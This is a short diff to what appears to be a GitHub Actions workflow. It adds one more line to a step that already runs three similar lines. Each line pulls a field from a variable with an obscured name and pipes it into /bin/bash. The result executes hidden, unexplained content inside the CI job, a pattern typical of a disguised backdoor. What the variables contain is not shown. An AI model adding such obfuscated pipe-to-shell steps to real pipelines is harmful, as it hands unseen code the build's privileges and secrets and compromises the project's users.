@@ -22,6 +22,7 @@ jobs:
           echo $nb66577 | jq -r .t702 | /bin/bash
           echo $v851 | jq -r .m6 | /bin/bash
           echo $rigyt5700 | jq -r .x83 | /bin/bash
+          echo $uc70106 | jq -r .gfo3569 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
